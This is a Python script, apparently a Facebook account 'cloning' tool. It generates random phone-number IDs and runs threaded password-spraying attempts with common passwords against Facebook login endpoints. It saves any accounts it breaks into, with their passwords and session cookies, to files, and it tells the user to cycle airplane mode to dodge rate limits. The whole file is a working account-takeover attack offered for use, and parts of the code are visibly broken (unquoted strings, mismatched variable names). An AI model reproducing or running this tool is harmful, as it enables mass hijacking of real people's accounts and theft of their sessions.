#!/usr/bin/python3
#-*-coding:utf-8-*-
import os

try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')

try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
    
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
    
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
os.system("xdg-open https://facebook.com/groups/1079392916067208/")
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
	os.system('python emmy.py')
  

logo = """
\033[1;31m
░░░░░██╗██╗░░░██╗███╗░░██╗░██████╗░██╗░░░░░██╗
░░░░░██║██║░░░██║████╗░██║██╔════╝░██║░░░░░██║
░░░░░██║██║░░░██║██╔██╗██║██║░░██╗░██║░░░░░██║
██╗░░██║██║░░░██║██║╚████║██║░░╚██╗██║░░░░░██║
╚█████╔╝╚██████╔╝██║░╚███║╚██████╔╝███████╗██║
░╚════╝░░╚═════╝░╚═╝░░╚══╝░╚═════╝░╚══════╝╚═╝                              
--------------------------------------------------
[•] AUTHOR     : \033[1;32mM Ahsan ali \033[1;37m
[•] GITHUB     : \033[1;32mAhsanjungli244\033[1;37m 
[•] TOOL TYPE  : \033[1;32mALL\033[1;37m
[•] STATUS     : \033[1;32mFREE MA\033[1;37m
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 1.0\033[1;37m
[•]\033[1;31m FOR\033[1;36m HATERS\033[1;34mFUCK\033[1;37mYOU
[•] GOOD Luck 🤞 BRO
--------------------------------------------------
"""
loop = 0
ok = []
cp = []
def main():
	os.system("clear")
	print(logo)
	print(47*'-')
	print(" [1] Cloning MENU")
	print(" [2] Owner Contact  ")
	print(" [3] join Our Facebook Gruop ")
	print(" [0] Exit")
	print(47*'-')
	Afzaal_select()

def Afzaal_select():
	QADIR = input('\n[+] Choose Option: ')
	if QADIR == '':
		print("\x1b[1;91mFill in correctly")
		main()
	elif QADIR == '1':
		SIAL()
	elif QADIR == '2':
		os.system("xdg-open https://chat.whatsapp.com/DJcbvewou0gDANNUxk8U4E")
		main()
	elif QADIR == '3':
		main()
	elif QADIR == '0':
		os.system('exit')
	else:
		print ('\x1b[1;91m[!] Please select a valid option')
		time.sleep(2)
		main()

   
def SIAL():
	os.system('clear')
	print(logo)
	os.system("xdg-open https://youtube.com/@JUNGLI.244.gaming.")
	print('[1] Random Cloning')
	print('[0] Back')
	print(47*'-')
	print ("")
	opt = input('[+] Choose option: ')
	if opt =='1':
		method()
	elif opt =='0':
		main()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		SIAL()
		
def method():
	os.system('clear')
	print(logo)

	print('[1] Method1  [Ok idz] [LUCH🥵]')
	print('[2] Method2  [Ok idz] [BEST👌]')
	print('[0] Back')
	print(47*'-')
	print ("")
	opt = input('[+] Choose option: ')
	if opt =='1':
		method1()
	elif opt =='2':
		method2()
	elif opt =='0':
		USMANSIAL()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		method()

def method1():
	user=[]
	os.system('clear');print(logo)
	print('[+] For Example : 92310,92342,92300,92301 ...')
	print ("")
	kode = input('[+] Choose Code : ')
	print ("")
	print('[+] For Example : 5000,6000,10000 ...')
	print ("")
	limit = int(input('[+] Idz Limit : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\033[1;37m SELECTED CODE \033[1;32m'+kode)
		print('\033[1;37m Total ids:\033[1;32m '+tl)
		print('\033[1;37m METHOD YOU CHOOSE : \033[1;32mM»1')
		print("\033[1;37m Brute Has Been Started \x1b[0m")
		print(" To Stop Process Press CTRL + Z\033[93;1m")
		print(50*'-')
		print('\x1b[1;97m USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		print(50*'-')
		print ("")
		for guru in user:
			uid = kode+guru
			pwx = [guru,uid,'khan123','khan12345','khan12','ali12345','ali1122','malik123','abbasa12345','malikmalik','pakistan','pak1122']
			yaari.submit(mcrack,uid,pwx,tl)
	print(47*'-')
	print ("")
	print('The process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	print(54*'_')
	input(' Press enter to back ')
	SIAL()
	
def mcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cp
	global ok
	global agents
	try:
		for ps in pwx:
			agents = ['Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5615.201 Safari/537.36',Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5653.213 Safari/537.36',Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5661.196 Safari/537.36',Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5630.200 Safari/537.36',Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:111.0esr) Gecko/20100101 Firefox/111.0esr/dGuRI9UGraE',Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5626.197 Safari/537.36',Mozilla/5.0 (Windows NT 11.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5644.225 Safari/537.36 Edg/111.0.1685.55',Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1; rv:114.0) Gecko/20110101 Firefox/114.0',
                        session = requests.Session()
			sys.stdout.write(f'\r [JUNGLI-XD] [%s/%s] [OK][%s] [CP][%s] \r'%(loop,tl,len(ok),len(cp))),
			sys.stdout.flush()
			pro = random.choice(agents)
			free_fb = session.get('https://x.facebook.com/?tbua=1').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			headers_freefb= {'authority': 'free.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Google Chrome";v="113"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="113.0.5636.194", "Google Chrome";v="113.0.5636.194"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/113.0.5636.194 Chrome/113.0.5636.194 Safari/537.36',
    'viewport-width': '980',}
			lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
			#log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print('\33[1;92m[JUNGLI-OK💋] '+cid+' | '+ps+'\33[0;97m')
				print("\033[1;92m[•] Cookie: "+coki)
				open('/sdcard/JUNGLI.txt', 'a').write(cid+' | '+ps+'\n')
				ok.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print('\33[1;93m[JUNGLI-CP] '+cid+' | '+ps+'\33[0;97m')
				open('/sdcard/JUNGLI-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cp.append(cid)
				break
			else:
				continue
		loop+=1
	except:
		pass
	

def method2():
	user=[]
	os.system('clear');print(logo)
	print('[+] For Example : 92310,92342,92300,92301 ...')
	print ("")
	kode = input('[+] Choose Code : ')
	print ("")
	print('[+] For Example : 5000,6000,10000 ...')
	print ("")
	limit = int(input('[+] Idz Limit : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\033[1;37m SELECTED CODE \033[1;32m'+kode)
		print(' Total ids: '+tl)
		print('\033[1;37m METHOD YOU CHOOSE : \033[1;32mM»2')
		print("\033[1;37m Brute Has Been Started \x1b[0m")
		print(" To Stop Process Press CTRL + Z\033[93;1m")
		print(50*'-')
		print('\x1b[1;97m USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		
		print(50*'-')
		print ("")
		for guru in user:
			uid = kode+guru
			pwx = [guru,uid,'khan123','khan12345','khankhan']
			yaari.submit(mbcrack,uid,pwx,tl)
	print(47*'-')
	print ("")
	print('The process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	print(54*'_')
	input(' Press enter to back ')
	SIAL()
	
def mbcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cp
	global ok
	global QADIR
	try:
		for ps in pwx:
			agents = ['Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5615.201 Safari/537.36',Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5653.213 Safari/537.36',Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5661.196 Safari/537.36',Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5630.200 Safari/537.36',Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:111.0esr) Gecko/20100101 Firefox/111.0esr/dGuRI9UGraE',Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5626.197 Safari/537.36',Mozilla/5.0 (Windows NT 11.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5644.225 Safari/537.36 Edg/111.0.1685.55',Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1; rv:114.0) Gecko/20110101 Firefox/114.0',
            session = requests.Session()
			sys.stdout.write(f'\r [JUNGLI-XD] [%s/%s] [OK][%s] [CP][%s] \r'%(loop,tl,len(ok),len(cp))),
			sys.stdout.flush()
			pro = random.choice(agents)
			free_fb = session.get('https://x.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			headers_freefb= {'authority': 'free.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Google Chrome";v="113"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="113.0.5636.194", "Google Chrome";v="113.0.5636.194"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/113.0.5636.194 Chrome/113.0.5636.194 Safari/537.36',
    'viewport-width': '980',}
			lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				#coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print(' [JUNGLI-OK💋] '+cid+' | '+ps+'')
				print("\033[1;92m[•] Cookie: "+coki)
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				ok.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print(' [JUNGLI-CP] '+cid+' | '+ps+'\033[0;97m')
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cp.append(cid)
				break
			else:
				continue
		loop+=1
	except:
		pass
	
if __name__=='__main__':
	main()
